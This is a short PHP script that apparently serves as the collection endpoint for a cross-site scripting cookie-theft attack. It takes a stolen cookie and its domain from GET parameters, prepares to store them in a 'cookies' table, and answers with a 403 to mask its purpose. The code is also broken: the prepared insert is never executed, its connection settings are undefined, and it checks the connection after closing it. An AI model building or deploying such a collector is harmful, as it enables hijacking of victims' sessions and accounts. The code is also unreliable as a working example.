<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
  
  function test_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
  }
  
  $cookie = test_input($_GET["c"]);
  $domain = test_input($_GET["d"]);
  
  // Save to database
  $conn = new mysqli($server, $user, $password, $dbname);
  
  // Prepare, bind and execute
  $stmt = $conn->prepare("INSERT INTO cookies (cookie, domain) VALUES (?, ?)");
  $stmt->bind_param("ss", $cookie, $domain);
  $stmt->close();
  $conn->close();

  // Send a 403
  if (! $conn->ping()){
    header('HTTP/1.0 403 Forbidden');
  }
}